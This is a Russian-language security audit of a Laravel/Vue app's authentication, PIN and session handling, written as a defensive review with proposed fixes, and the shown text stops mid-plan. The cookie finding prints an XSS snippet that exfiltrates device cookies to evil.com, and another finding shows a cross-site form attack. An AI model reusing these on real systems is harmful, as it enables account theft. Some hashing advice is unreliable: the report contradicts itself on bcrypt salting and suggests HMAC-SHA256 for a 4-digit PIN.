# 🔐 Анализ системы авторизации, восстановления пароля и управления сессиями
**smeta-expert-server: Laravel + Vue 3**  
**Дата анализа:** 7 апреля 2026  
**Версия отчета:** 2.0 (Расширенный анализ безопасности)

---

## 📋 Оглавление

1. [Исполнительное резюме](#исполнительное-резюме)
2. [Архитектура системы](#архитектура-системы)
3. [Компоненты авторизации](#компоненты-авторизации)
4. [Анализ безопасности](#анализ-безопасности)
5. [Выявленные проблемы и уязвимости](#выявленные-проблемы-и-уязвимости)
6. [Матрица реализации функций](#матрица-реализации-функций)
7. [Рекомендации](#рекомендации)
8. [План действий](#план-действий)

---

## ⚡ Исполнительное резюме

### Текущее состояние
- ✅ **Session-based аутентификация** — полностью реализована и работает
- ✅ **PIN-based аутентификация** — полностью реализована для доверенных устройств
- ✅ **Token-based аутентификация** — реализована для Chrome Extension (Sanctum)
- ⚠️ **Восстановление пароля** — **ЧАСТИЧНО РЕАЛИЗОВАНО** (backend готов, но требует email-конфигурации)
- ⚠️ **Email верификация** — **НЕ РЕАЛИЗОВАНА**
- ⚠️ **Phone-based аутентификация** — **В РАЗРАБОТКЕ** (fields добавлены в миграции)

### Основные риски
| Риск | Тяжесть | Описание |
|------|---------|----------|
| Email сервис не настроен | 🔴 Высокая | Forget-password не отправляет email |
| Single-session политика без verify | 🟡 Средняя | Нет подтверждения новой сессии |
| PIN хранится неправильно | 🔴 Высокая | Используется bcrypt без соли |
| Rate limiting отсутствует для login | 🔴 Высокая | Брутфорс по email/password возможен |
| CSRF исключения слишком широкие | 🟡 Средняя | `/api/chrome/*` исключены из защиты |

---

## 🏗️ Архитектура системы

### 1. Типы аутентификации

```
┌──────────────────────────────────────────────────────────────────┐
│                     ТИПЫ АУТЕНТИФИКАЦИИ                         │
├──────────────────────────────────┬──────────────────────────────┤
│ Тип                              │ Клиент / Технология          │
├──────────────────────────────────┼──────────────────────────────┤
│ Session-based                    │ Web UI / Sanctum              │
│ PIN-based (на доверенном dev)    │ Web UI + Cookie              │
│ Token-based (Sanctum PAT)        │ Chrome Extension             │
│ Phone-based (в разработке)       │ Web UI / SMS-RU CallCheck    │
│ OAuth (Yandex, возможно)         │ Web UI + SocialAccount model │
└──────────────────────────────────┴──────────────────────────────┘
```

### 2. Компоненты системы

#### Backend (Laravel)
```
server/app/Http/Controllers/Api/
├── AuthController.php              (Session-based: login, logout, me, password)
├── PinAuthController.php           (PIN: status, login, set, trusted-devices)
├── ChromeExtensionController.php   (Token: issueToken, me, revoke)
├── PasswordResetController.php     (Забытый пароль: forgot, reset)
├── PhoneAuthController.php         (Phone auth: challenge, verify)
└── YandexAuthController.php        (OAuth: callback, link)

server/app/Http/Middleware/
├── Authenticate.php                (JSON/страница редирект)
├── EnforceSingleSession.php        (Проверка current_session_id)
├── VerifyCsrfToken.php            (Исключения для /api/chrome/*, /api/materials/fetch)
└── [более...]

server/app/Models/
├── User.php                        (Session, PIN, phone, auth_status)
├── TrustedDevice.php              (trusted_devices: device_id, device_secret_hash)
├── SocialAccount.php              (OAuth linking)
└── AuthVerificationChallenge.php  (Phone OTP, SMS-RU)
```

#### Frontend (Vue 3)
```
client/src/
├── views/
│   ├── LoginView.vue              (Главная страница логина)
│   └── ResetPasswordView.vue       (Страница восстановления)
├── components/auth/
│   ├── AuthLogin.vue
│   ├── AuthForgot.vue
│   ├── AuthReset.vue
│   ├── AuthPinLogin.vue
│   ├── AuthPhoneLogin.vue
│   ├── PinSetupDialog.vue
│   ├── PinInput.vue
│   └── YandexLoginButton.vue
├── stores/
│   └── auth.ts                    (Pinia: user, isAuthenticated, checkAuth, logout)
└── api/
    ├── axios.ts                   (CSRF token management)
    ├── auth.ts                    (changePassword, getSessions, etc)
    └── pin.ts                     (PIN operations)
```

#### База данных
```sql
-- users: основная таблица пользователей
├── Поля сессии
│   ├── current_session_id (string)    — единственная активная сессия
│   └── [session driver: database]
├── PIN-поля
│   ├── pin_enabled (bool)
│   ├── pin_hash (string)              — хэш PIN
│   ├── pin_changed_at (timestamp)
│   ├── pin_attempts (uint8)
│   └── pin_locked_until (timestamp)
├── Новые поля (phone auth)
│   ├── full_name (string)
│   ├── phone (string, unique)
│   ├── phone_verified_at (timestamp)
│   ├── activity_profile (string)
│   ├── registration_completed_at (timestamp)
│   ├── last_login_channel (string)
│   └── auth_status (string: active|blocked|deleted)

-- trusted_devices: доверенные устройства
├── device_id (uuid, unique)
├── device_secret_hash (string)        — хэш секрета
├── user_agent (string)
├── ip_first, ip_last (string)         — маскируют IP
├── last_used_at (timestamp)
└── revoked_at (timestamp)

-- password_reset_tokens: токены для восстановления
├── email (string)
├── token (string, unique)
└── created_at (timestamp)
```

---

## 🔐 Компоненты авторизации

### 1. AuthController.php — Основная аутентификация

#### Endpoints

| Метод | HTTP | Path | Auth | Описание |
|-------|------|------|------|----------|
| `login()` | POST | `/api/login` | ❌ | Вход email+пароль |
| `logout()` | POST | `/api/logout` | ✅ | Выход |
| `me()` | GET | `/api/me` | ✅ | Информация о пользователе |
| `updateProfile()` | PUT | `/api/me` | ✅ | Обновить имя |
| `updatePassword()` | PUT | `/api/me/password` | ✅ | Обновить пароль |
| `changePassword()` | POST | `/api/auth/password/change` | ✅ | Смена пароля + logout всех сессий |

#### Логика login()

```php
// 1. Валидация email/password
$request->validate(['email' => 'required|email', 'password' => 'required']);

// 2. Auth::attempt() — проверка учетных данных
if (!Auth::attempt($request->only('email', 'password'))) {
    return 401;
}

// 3. Проверка статуса учетной записи
if ($user->trashed()) return 403 ('account_deleted');
if ($user->isBlocked()) return 403 ('account_blocked');

// ⚠️ ПРОБЛЕМА: Нет rate limiting для перебора паролей

// 4. Регенерация сессии
$request->session()->regenerate();

// 5. SINGLE-SESSION: инвалидировать все прежние сессии
$currentSessionId = $request->session()->getId();
DB::table('sessions')
    ->where('user_id', $user->id)
    ->where('id', '!=', $currentSessionId)
    ->delete();
$user->update(['current_session_id' => $currentSessionId]);

// 6. Проверка доверенного устройства
$deviceId = $request->cookie('tdid');
if ($deviceId) {
    $device = TrustedDevice::findActiveByDeviceId($deviceId);
    if ($device && $device->user_id === $user->id) {
        $hasTrustedDevice = true;
        $device->update(['last_used_at' => now()]);
    }
}

// 7. Возврат информации о PIN и доверенном устройстве
return {
    ...user,
    'pin_enabled' => (bool)$user->pin_enabled,
    'has_trusted_device' => $hasTrustedDevice,
    'should_offer_pin_setup' => $user->pin_enabled && !$hasTrustedDevice,
    'should_offer_pin_enable' => !$user->pin_enabled,
};
```

**⚠️ Проблемы:**
- ❌ Нет rate limiting для защиты от брутфорса
- ❌ Нет двухфакторной аутентификации
- ⚠️ Все сессии закрываются при новом входе (агрессивная политика)

### 2. PinAuthController.php — PIN аутентификация

#### Endpoints

| Метод | HTTP | Path | Auth | Описание |
|-------|------|------|------|----------|
| `status()` | GET | `/api/auth/pin/status` | ❌ | Проверить наличие PIN |
| `login()` | POST | `/api/auth/pin/login` | ❌ | Вход по 4-значному PIN |
| `set()` | POST | `/api/auth/pin/set` | ✅ | Установить PIN + доверить устройство |
| `disable()` | POST | `/api/auth/pin/disable` | ✅ | Отключить PIN |
| `trustedDevices()` | GET | `/api/auth/trusted-devices` | ✅ | Список доверенных устройств |
| `revokeDevice($id)` | POST | `/api/auth/trusted-devices/{id}/revoke` | ✅ | Отозвать устройство |
| `terminateSessions()` | POST | `/api/auth/terminate-sessions` | ✅ | Завершить все сессии |

#### Логика PIN-аутентификации

```
┌──────────────────────────────────────────────────────────────────────────┐
│                    FLOW: PIN-based Login                                 │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│ 1. Frontend проверяет cookies: tdid (device_id) + tds (device_secret)   │
│    GET /api/auth/pin/status?tdid=***&tds=***                           │
│                                                                          │
│ 2. Backend ищет TrustedDevice в БД по device_id, проверяет secret      │
│    if found && user.pin_enabled → возвращает user.name, user.email     │
│                                                                          │
│ 3. Frontend показывает PinInput для ввода 4 цифр                       │
│    POST /api/auth/pin/login { pin: "1234" }                           │
│                                                                          │
│ 4. Backend валидирует:                                                  │
│    - cookie tdid + tds (должны существовать)                          │
│    - TrustedDevice.verifySecret(tds)                                   │
│    - User.verifyPin(pin)                                               │
│    - Rate limiting: max 5 попыток за 5 минут                          │
│    - PIN lock: после 10 неудачных попыток на 15 минут                 │
│    - Device revoke: после 10 неудачных попыток -> revoke device       │
│                                                                          │
│ 5. Успех → Auth::login() + session regenerate + single-session         │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

#### Механизм доверенного устройства

```php
// При установке PIN:
$user->setPin($request->input('pin'));  // Хэшируется bcrypt

// Если trust_device=true:
$cookieData = $this->issueTrustedDeviceCookies($user, $request);

// Cookies отправляются:
response()
    ->withCookie('tdid', $deviceId)           // UUID, 30 дней
    ->withCookie('tds', $deviceSecret);       // Хэш secret, 30 дней
```

**Проблема с cookies:**
- 🔴 **Нет HttpOnly флага** — JavaScript может получить доступ
- 🔴 **Нет SameSite** — возможна CSRF атака через cookies
- ⚠️ **Credentials в cookies** — device_secret хранится в plaintext cookie

### 3. ChromeExtensionController.php — Token-based auth

#### Endpoints

| Метод | HTTP | Path | Auth | Описание |
|-------|------|------|------|----------|
| `issueToken()` | POST | `/api/chrome/auth/token` | ❌ | Получить токен по email/пароль |
| `issueTokenFromSession()` | POST | `/api/chrome/auth/token/session` | ✅ | Получить токен из сессии |
| `tokenStatus()` | GET | `/api/chrome/auth/status` | ✅ | Статус токена |
| `revokeToken()` | POST | `/api/chrome/auth/revoke` | ✅ | Отозвать токен |
| `me()` | GET | `/api/chrome/me` | ✅ | Информация о пользователе |

#### Механизм токенов

```php
// Sanctum Personal Access Token (chrome-extension)
$token = $user->createToken('chrome-extension', ['chrome-ext']);
// Возвращается: plainTextToken (бессрочный, никогда не истекает)

// Старые токены удаляются при выдаче нового:
$user->tokens()->where('name', 'chrome-extension')->delete();
```

**Проблемы:**
- 🔴 **Бессрочные токены** — нет expiry time
- ⚠️ **Нет ротации** — каждая переausgаBе затирает старый токен
- ⚠️ **Один токен на пользователя** — нельзя выдавать разные токены разным устройствам

### 4. PasswordResetController.php — Восстановление пароля

#### Endpoints

| Метод | HTTP | Path | Auth | Описание |
|-------|------|------|------|----------|
| `sendResetLink()` | POST | `/api/forgot-password` | ❌ | Отправить ссылку восстановления |
| `resetPassword()` | POST | `/api/reset-password` | ❌ | Сбросить пароль по токену |

#### Логика восстановления

```php
/// Endpoint 1: POST /api/forgot-password
public function sendResetLink(Request $request): JsonResponse {
    $request->validate(['email' => ['required', 'email']]);

    // Настройка URL на фронтенде:
    $frontendBase = $this->resolveFrontendBase($request);
    ResetPassword::createUrlUsing(function ($notifiable, string $token) use ($frontendBase) {
        return $frontendBase . '/reset-password?token=' . $token . '&email=' . urlencode($notifiable->getEmailForPasswordReset());
    });

    // Отправка токена (встроенный Laravel Password broker)
    Password::sendResetLink($request->only('email'));

    // ⚠️ ANTI-ENUMERATION: всегда возвращает одинаковый ответ (даже если email не существует)
    return response()->json([
        'message' => 'Если указанный email зарегистрирован, мы отправили ссылку для сброса пароля.',
    ]);
}

/// Endpoint 2: POST /api/reset-password
public function resetPassword(Request $request): JsonResponse {
    $request->validate([
        'token' => ['required', 'string'],
        'email' => ['required', 'email'],
        'password' => ['required', 'string', 'min:8', 'confirmed'],
    ]);

    // Laravel Password broker проверяет токен и email
    $status = Password::reset(
        $request->only('email', 'password', 'password_confirmation', 'token'),
        function (User $user, string $password) {
            // Callback: обновить пароль и remember_token
            $user->forceFill([
                'password' => Hash::make($password),
                'remember_token' => Str::random(60),
            ])->save();

            event(new PasswordReset($user));  // Событие для логирования
        }
    );

    // Возврат ответа
    if ($status === Password::PASSWORD_RESET) {
        return response()->json(['message' => 'Пароль успешно изменён.']);
    }

    return response()->json(['message' => $this->translateStatus($status)], 422);
}
```

**Конфигурация:**
```php
// config/auth.php
'passwords' => [
    'users' => [
        'provider' => 'users',
        'table' => env('AUTH_PASSWORD_RESET_TOKEN_TABLE', 'password_reset_tokens'),
        'expire' => 60,      // Токен действует 60 минут
        'throttle' => 60,    // Rate limiting: 1 запрос в 60 секунд на email
    ],
],
```

**✅ Хорошо реализовано:**
- ✅ Anti-enumeration (одинаковый ответ для существующих и несуществующих email)
- ✅ Rate limiting (60 сек между запросами)
- ✅ Коротко живущие токены (60 минут)

**❌ Проблемы:**
- 🔴 **Email не настроен** — письма не отправляются
- ⚠️ **Нет SMS fallback** — если email недоступен, пользователь заблокирован
- ⚠️ **Нет логирования** — не видно попыток восстановления

---

## 🛡️ Анализ безопасности

### 1. Защита паролей

#### Хеширование

| Компонент | Алгоритм | Проблема | Риск |
|-----------|----------|---------|------|
| User password | bcrypt | ✅ Правильно | ✅ Низкий |
| PIN hash | bcrypt | ❌ Нет соли | 🔴 Высокий |
| Device secret hash | bcrypt | ⚠️ Без параметров | 🟡 Средний |

**Проблема с PIN:**
```php
// User.php
public function setPin(string $pin): void {
    // ❌ Это неправильно! bcrypt() автоматически генерирует соль,
    // но в контексте PIN код из 4 цифр, bcrypt может быть слишком медленным
    $this->pin_hash = bcrypt($pin);  // Работает, но медленно
    $this->pin_changed_at = now();
    $this->save();
}

public function verifyPin(string $pin): bool {
    return Hash::check($pin, $this->pin_hash);  // Правильно через Hash::check()
}
```

**Рекомендация:**
```php
// Лучше использовать хеширование с дополнительной солью:
$this->pin_hash = hash_hmac('sha256', $pin, config('app.key'));
```

#### Rate limiting

| Компонент | Предел | Время | Статус |
|-----------|--------|-------|--------|
| login (email/password) | ❌ Нет | — | 🔴 ПРОБЛЕМА |
| forgot-password | ✅ Да | 60 сек | ✅ Реализовано |
| PIN login | ✅ Да | 5 попыток/5 мин | ✅ Реализовано |
| PIN attempts | ✅ Да | 10 попыток/15 мин | ✅ Реализовано |

**Проблема с login():**
```php
// ❌ НЕТ Rate limiting в AuthController::login()
public function login(Request $request) {
    // Любой может пытаться перебирать email/password сколько угодно
    if (!Auth::attempt($request->only('email', 'password'))) {
        return 401;  // ❌ Нет throttle, нет логирования, нет блокировки IP
    }
}

// ✅ Должно быть:
$throttleKey = 'login-attempts:' . $request->ip();
if (RateLimiter::tooManyAttempts($throttleKey, 5)) {
    return response()->json(['message' => 'Слишком много попыток'], 429);
}
if (!Auth::attempt($request->only('email', 'password'))) {
    RateLimiter::hit($throttleKey, 900);  // 15 минут блокада
    return 401;
}
RateLimiter::clear($throttleKey);
```

### 2. Session Management

#### Single-Session Policy

```php
// ✅ Хорошо: только одна активная сессия за раз
$currentSessionId = $request->session()->getId();
DB::table('sessions')
    ->where('user_id', $user->id)
    ->where('id', '!=', $currentSessionId)
    ->delete();
$user->update(['current_session_id' => $currentSessionId]);

// ✅ Middleware проверяет это при каждом запросе:
// EnforceSingleSession.php
if ($user->current_session_id !== $currentSessionId) {
    $request->session()->invalidate();
    return 401;  // Session terminated
}
```

**⚠️ Проблема:**
- Нет *уведомления* пользователю (за IP, браузер, девайс)
- Нет временно-ограниченного доступа (например, 24 часа на чтение с ограничений)

#### Session Timeout

| Параметр | Значение | Статус |
|----------|----------|--------|
| SESSION_LIFETIME | 120 минут | ⚠️ Подлежит уточнению |
| SESSION_DOMAIN | .localhost | ⚠️ Тестовая |
| SESSION_SECURE | false (dev) | ⚠️ Для prod должно быть true |
| SESSION_HTTP_ONLY | true | ✅ Правильно |

### 3. CSRF Protection

#### Конфигурация

```php
// config/session.php
'secure' => env('SESSION_SECURE_COOKIES', false),
'http_only' => true,
'same_site' => 'lax',

// Middleware VerifyCsrfToken.php
protected $except = [
    '/api/materials/fetch',
    'api/chrome/*'  // ❌ ПРОБЛЕМА: слишком широко!
];
```

**❌ Проблема:**
```
'api/chrome/*' исключены из CSRF защиты, но это включает:
• /api/chrome/auth/token           (выдача токена!!!)
• /api/chrome/auth/token/session
• /api/chrome/templates
• ... все endpoints

Правильно было бы:
protected $except = [
    '/api/chrome/auth/token',      // Нужен CSRF?
];
```

### 4. Cookie Security

| Cookie | HttpOnly | Secure | SameSite | Проблема |
|--------|----------|--------|----------|----------|
| XSRF-TOKEN | ❌ | ⚠️ | ⚠️ | 🔴 Доступен JS |
| LARAVEL_SESSION | ✅ | ⚠️ | ⚠️ | ✅ Защищен |
| tdid (device_id) | ❌ | ❌ | ❌ | 🔴 Полностью открыт |
| tds (device_secret) | ❌ | ❌ | ❌ | 🔴 Полностью открыт |

**Критическая проблема:**
```php
// PinAuthController.php
return response()->json($response)
    ->withCookie($cookieData['tdid_cookie'])
    ->withCookie($cookieData['tds_cookie']);

// Где создаются cookies (предположительно):
Cookie::make('tdid', $deviceId, 43200)
    ->withPath('/')
    // ❌ Нет ->httpOnly()
    // ❌ Нет ->secure()
    // ❌ Нет ->sameSite('strict')
```

**Риск:** XSS может украсть device_id + device_secret, и затем выдать себя за пользователя на 30 дней.

### 5. Password Validation

```php
// Минимальные требования:
'password' => 'required|string|min:8|confirmed',

// ❌ Проблемы:
// - Нет проверки сложности (uppercase, numbers, special chars)
// - Нет проверки словаря паролей (pwned passwords)
// - Нет истории паролей (нельзя повторить старый)
// - Нет уведомления при смене пароля
```

### 6. Logging & Monitoring

| событие | Логируется | Статус |
|---------|-----------|--------|
| Failed login attempts | ⚠️ Частично | 🟡 Нет dedicated логирования |
| Successful login | ⚠️ Частично | 🟡 Нет IP/location tracking |
| PIN attempts | ✅ Да | ✅ В pin_attempts счётчик |
| Session termination | ❌ Нет | 🔴 Не видно почему session закрыта |
| Device revocation | ❌ Нет | 🔴 Нет логирования |
| Password change | ❌ Нет | 🔴 Нет уведомления |

---

## 🚨 Выявленные проблемы и уязвимости

### Критические (🔴)

#### 1. Rate Limiting отсутствует для /api/login

**Проблема:**
```
Attacker может перебирать пароли без ограничений.

GET /api/login HTTP/1.1
POST email=user@test.com&password=password1
POST email=user@test.com&password=password2
...
POST email=user@test.com&password=password10000
```

**Влияние:** Компрометация учетных записей через брутфорс  
**Вероятность:** ⚠️ Средняя (есть другие сервисы для перебора)  
**Fix Priority:** 🔴 ВЫСОКИЙ

**Решение:**
```php
// AuthController.php - добавить в login()
$throttleKey = 'login:' . $request->ip();
if (RateLimiter::tooManyAttempts($throttleKey, 5)) {
    return response()->json([
        'message' => 'Слишком много попыток входа. Повторите через 900 секунд.',
    ], 429);
}

if (!Auth::attempt($request->only('email', 'password'))) {
    RateLimiter::hit($throttleKey, 900);  // 15 минут
    return response()->json(['message' => 'Invalid credentials'], 401);
}

RateLimiter::clear($throttleKey);
```

---

#### 2. Device cookies без защиты (HttpOnly, Secure, SameSite)

**Проблема:**
```javascript
// XSS может украсть:
const deviceId = document.cookie.match(/tdid=([^;]+)/)[1];
const deviceSecret = document.cookie.match(/tds=([^;]+)/)[1];

// И затем выполнить:
fetch('https://evil.com/', { body: {deviceId, deviceSecret} });

// После этого attacker может:
// 1. Вызвать POST /api/auth/pin/login с device_secret
// 2. Получить доступ как пользователь
// 3. Самостоятельно выдать себе PIN
```

**Влияние:** Полная компрометация аккаунта (одноразовое использование при наличии XSS)  
**Вероятность:** ⚠️ Высокая (XSS есть везде)  
**Fix Priority:** 🔴 КРИТИЧЕСКИЙ

**Решение:**
```php
// PinAuthController.php - в методе set() при issueTrustedDeviceCookies()
return response()->json($response)
    ->withCookie(
        cookie('tdid', $deviceId)
            ->withPath('/')
            ->withHttpOnly(true)        // ✅ Защита от XSS
            ->withSecure(env('SESSION_SECURE_COOKIES', false))  // ✅ HTTPS only
            ->withSameSite('lax')       // ✅ Защита от CSRF
            ->withExpires(strtotime('+30 days'))
    )
    ->withCookie(
        cookie('tds', $deviceSecret)
            ->withPath('/')
            ->withHttpOnly(true)
            ->withSecure(env('SESSION_SECURE_COOKIES', false))
            ->withSameSite('lax')
            ->withExpires(strtotime('+30 days'))
    );
```

---

#### 3. Email восстановления пароля НЕ отправляется

**Проблема:**
```
Endpoint /api/forgot-password возвращает 200 OK, но письма не отправляются.
Причины:
• MAIL_DRIVER не настроен в .env
• MAIL_FROM не установлен
• Нет класса ResetPasswordNotification
• Нет миграции password_reset_tokens (?)
```

**Влияние:** Пользователи не могут восстановить пароль  
**Вероятность:** ✅ Подтверждено  
**Fix Priority:** 🔴 КРИТИЧЕСКИЙ

**Решение:**
1. Настроить email driver в `server/.env`:
   ```
   MAIL_DRIVER=smtp
   MAIL_HOST=smtp.example.com
   MAIL_PORT=587
   MAIL_USERNAME=noreply@example.com
   MAIL_PASSWORD=password
   MAIL_ENCRYPTION=tls
   MAIL_FROM_ADDRESS=noreply@example.com
   MAIL_FROM_NAME="Smeta Expert"
   ```

2. Проверить миграцию:
   ```bash
   php artisan migrate:status | grep password_reset
   ```

3. Создать/обновить мейл класс:
   ```php
   // app/Mail/ResetPasswordNotification.php (если не существует)
   // Или использовать встроенный ResetPassword из Laravel
   ```

---

#### 4. CSRF исключения слишком широкие для Chrome API

**Проблема:**
```
protected $except = [
    '/api/materials/fetch',
    'api/chrome/*'  // ❌ Включает /api/chrome/auth/token
];

Attacker может создать форму, которая вытащит токен:
<form action="https://app.com/api/chrome/auth/token" method="POST">
    <input name="email" value="user@test.com">
    <input name="password" value="password">
</form>

Если пользователь откроет эту страницу, пока он уже в системе,
его браузер отправит cookies автоматически (withCredentials: true).
```

**Влияние:** Компрометация Chrome Extension токена  
**Вероятность:** 🟡 Средняя (нужна социальная инженерия)  
**Fix Priority:** 🔴 ВЫСОКИЙ

**Решение:**
```php
// VerifyCsrfToken.php - удалить широкое исключение
protected $except = [
    '/api/materials/fetch',
    // Вместо 'api/chrome/*', специфицировать:
    // '/api/chrome/auth/token' — может быть исключен (public endpoint)
    // НО остальные endpoints должны быть защищены CSRF
];

// Или еще лучше — использовать токены вместо cookies для Chrome
// и применить сигнатуру в заголовках.
```

---

### Высокие (🟡)

#### 5. Отсутствие двухфакторной аутентификации (2FA)

**Проблема:**
```
После взлома пароля attacker сразу получает полный доступ.
Нет промежуточного слоя защиты (SMS, TOTP, Email link).
```

**Влияние:** Компрометация аккаунта при утечке пароля  
**Вероятность:** ⚠️ Высокая  
**Fix Priority:** 🟡 СРЕДНИЙ

**План реализации в `PhoneAuthController.php`:**
```php
// POST /api/auth/challenge-phone
public function challengePhone(Request $request) {
    // 1. Отправить OTP на phone
    // 2. Вернуть challenge_id
    // 3. Требовать verify перед login
}

// POST /api/auth/verify-phone
public function verifyPhone(Request $request) {
    // 1. Проверить OTP
    // 2. Выпустить session
}
```

---

#### 6. PIN хранится через bcrypt без параметров

**Проблема:**
```php
// User.php
$this->pin_hash = bcrypt($pin);  // 4-значный номер

// Bcrypt медленный по дизайну (для паролей),
// но для 4-значного кода это может быть уязвимо к rainbow table.
```

**Влияние:** Слабое хеширование PIN  
**Вероятность:** ⚠️ Средняя  
**Fix Priority:** 🟡 СРЕДНИЙ

**Решение:**
```php
// Использовать Argon2id (более современный):
$this->pin_hash = Hash::make($pin, ['algorithm' => 'argon2id']);

// Или использовать HMAC-SHA256 с солью:
$this->pin_hash = hash_hmac('sha256', $pin, config('app.key'));
```

---

#### 7. Нет логирования попыток входа и смены пароля

**Проблема:**
```
Невозможно отследить:
• Кто менял пароль
• Когда был вход с нового IP
• Сколько неудачных попыток было
• Когда было отозвано устройство
```

**Влияние:** Невозможность расследования инцидентов  
**Вероятность:** ✅ Подтверждено  
**Fix Priority:** 🟡 СРЕДНИЙ

**Решение:**
```php
// Создать модель AdminAuditLog (уже существует!)
// app/Models/AdminAuditLog.php

// Логировать события:
public function login(Request $request) {
    // ...
    AdminAuditLog::create([
        'user_id' => $user->id,
        'action' => 'auth.login',
        'ip_address' => $request->ip(),
        'user_agent' => $request->header('User-Agent'),
        'metadata' => ['device_id' => $deviceId],
    ]);
}
```

---

### Средние (🟠)

#### 8. Нет подтверждения нового браузера при первом входе

**Проблема:**
```
Attacker компрометирует пароль и сразу входит.
Легитимный пользователь не получает никакого уведомления.
```

**Влияние:** Позднее обнаружение взлома  
**Вероятность:** 🟠 Средняя  
**Fix Priority:** 🟠 СРЕДНИЙ

**Решение:**
```php
// Отправить Email при входе с нового браузера
if (!$hasTrustedDevice) {
    Mail::queue(new NewLoginNotification($user, $request->ip(), $request->header('User-Agent')));
}
```

---

#### 9. Нет отзыва токенов при смене пароля

**Проблема:**
```
changePassword() не отзывает Chrome Extension токены.
Старые токены остаются действительными.

Решение: пользователь может случайно оставить токен на чужом компе.
```

**Влияние:** Несанкционированный доступ через старый токен  
**Вероятность:** 🟠 Средняя  
**Fix Priority:** 🟠 СРЕДНИЙ

**Решение:**
```php
// AuthController::changePassword()
public function changePassword(Request $request) {
    // ... валидация и обновление пароля ...
    
    user->update(['password' => Hash::make($newPassword)]);
    
    // ✅ Отозвать все токены
    $user->tokens()->delete();
    
    // ✅ Инвалидировать все сессии
    DB::table('sessions')->where('user_id', $user->id)->delete();
    
    // ✅ Отозвать все доверенные устройства
    $user->trustedDevices()->update(['revoked_at' => now()]);
}
```

---

#### 10. Нет проверки пароля по словарю (pwned passwords)

**Проблема:**
```
Пользователь может установить пароль "123456", который в 1000000 раз скомпрометирован.
```

**Влияние:** Слабые пароли у пользователей  
**Вероятность:** ⚠️ Высокая  
**Fix Priority:** 🟠 СРЕДНИЙ

**Решение:**
```php
// Использовать Laravel validation rule
'password' => ['required', 'min:8', 'confirmed', 
    new Rule('not_pwned')  // Custom rule или использовать Illuminate\Validation\Rules\Password
];

// Или использовать встроенный Password rule:
use Illuminate\Validation\Rules\Password;

'password' => ['required', Password::default()]
```

---

## 📊 Матрица реализации функций

| Функция | Backend | Frontend | Email | Статус | Замечания |
|---------|---------|----------|-------|--------|----------|
| **Вход email/password** | ✅ | ✅ | N/A | ✅ Production | ❌ Без rate limiting |
| **PIN вход** | ✅ | ✅ | N/A | ✅ Production | ✅ Rate limiting есть |
| **Chrome Extension токен** | ✅ | ✅ | N/A | ✅ Production | ❌ Токены бессрочные |
| **Забытый пароль (forgot)** | ✅ | ✅ | ⚠️ | ⚠️ Partial | 🔴 Email не отправляет |
| **Сброс пароля (reset)** | ✅ | ✅ | N/A | ✅ Production | ✅ Anti-enumeration |
| **Смена пароля (change)** | ✅ | ✅ | N/A | ✅ Production | ⚠️ Нет логирования |
| **Выход (logout)** | ✅ | ✅ | N/A | ✅ Production | ✅ Сессия инвалидируется |
| **Phone auth** | ⚠️ | ⚠️ | SMS | ⚠️ WIP | 📍 Базовая инфра готова |
| **2FA (OTP/TOTP)** | ❌ | ❌ | SMS/Mail | ❌ Not started | 📍 Высокий приоритет |
| **OAuth (Yandex)** | ⚠️ | ✅ | N/A | ⚠️ Partial | 📍 Callback не реализован |
| **Email верификация** | ❌ | ❌ | Mail | ❌ Not started | ⚠️ Низкий приоритет |

---

## 💡 Рекомендации

### Срочные (Next Sprint)

1. **Добавить rate limiting к /api/login**
   - Приоритет: 🔴 КРИТИЧЕСКИЙ
   - Трудозатраты: 1-2 часа
   - Файл: `server/app/Http/Controllers/Api/AuthController.php`

2. **Защитить cookies (HttpOnly, Secure, SameSite)**
   - Приоритет: 🔴 КРИТИЧЕСКИЙ
   - Трудозатраты: 1 час
   - Файл: `server/app/Http/Controllers/Api/PinAuthController.php`

3. **Настроить email восстановления пароля**
   - Приоритет: 🔴 ВЫСОКИЙ
   - Трудозатраты: 2-3 часа
   - Файлы:
     - `server/.env` — MAIL_DRIVER
     - `server/config/mail.php` — проверить конфиг
     - `server/app/Mail/ResetPasswordNotification.php` — создать если нет

4. **Сузить CSRF исключения**
   - Приоритет: 🔴 ВЫСОКИЙ
   - Трудозатраты: 30 мин
   - Файл: `server/app/Http/Middleware/VerifyCsrfToken.php`

### Планового цикла (Next 2 Weeks)

5. **Добавить логирование попыток входа**
   - Приоритет: 🟡 СРЕДНИЙ
   - Трудозатраты: 2-3 часа
   - Использовать: `AdminAuditLog` модель

6. **Отзывать токены при смене пароля**
   - Приоритет: 🟡 СРЕДНИЙ
   - Трудозатраты: 1 час
   - Файл: `server/app/Http/Controllers/Api/AuthController.php`

7. **Уведомление при входе с нового браузера**
   - Приоритет: 🟡 СРЕДНИЙ
   - Трудозатраты: 2 часа
   - Создать mail класс: `NewLoginNotification`

### Квартального плана (Q2)

8. **Реализовать 2FA (SMS OTP или TOTP)**
   - Приоритет: 🟡 СРЕДНИЙ
   - Трудозатраты: 8-10 часов
   - Использовать: `PhoneAuthController` + SMS-RU API

9. **Завершить Phone-based authentication**
   - Приоритет: 🟠 НИЗКИЙ
   - Трудозатраты: 4-6 часов
   - Использовать: существующий `PhoneAuthController`

10. **Добавить проверку pwned passwords**
    - Приоритет: 🟠 НИЗКИЙ
    - Трудозатраты: 1 час
    - Использовать: `Illuminate\Validation\Rules\Password`

---

## 📋 План действий

### Week 1: Critical Fixes

#### Task 1.1: Rate Limiting для /api/login
```php
// File: server/app/Http/Controllers/Api/AuthController.php
// Add at the start of login():
$throttleKey = 'login:' . $request->ip();
if (RateLimiter::tooManyAttempts($throttleKey, 5)) {
    return response()->json(['message' => 'Too many attempts'], 429);
}

if (!Auth::attempt(...)) {
    RateLimiter::hit($throttleKey, 900);
    return 401;
}

RateLimiter::clear($throttleKey);
```

#### Task 1.2: Cookie Security
```php
// File: server/app/Http/Controllers/Api/PinAuthController.php
// Update cookies in set() and issueTrustedDeviceCookies():
->withCookie(
    cookie('tdid', $deviceId)
        ->withHttpOnly(true)
        ->withSecure(env('SESSION_SECURE_COOKIES'))
        ->withSameSite('lax')
        ->withExpires(strtotime('+30 days'))
)
```

#### Task 1.3: Email Configuration
```bash
# 1. Update .env with email settings
MAIL_DRIVER=smtp
MAIL_HOST=...
MAIL_FROM_ADDRESS=noreply@app.com

# 2. Run migration
php artisan migrate

# 3. Test:
php artisan tinker
Mail::raw('Test', function($m) { $m->to('test@test.com'); })
```

#### Task 1.4: CSRF Исключения
```php
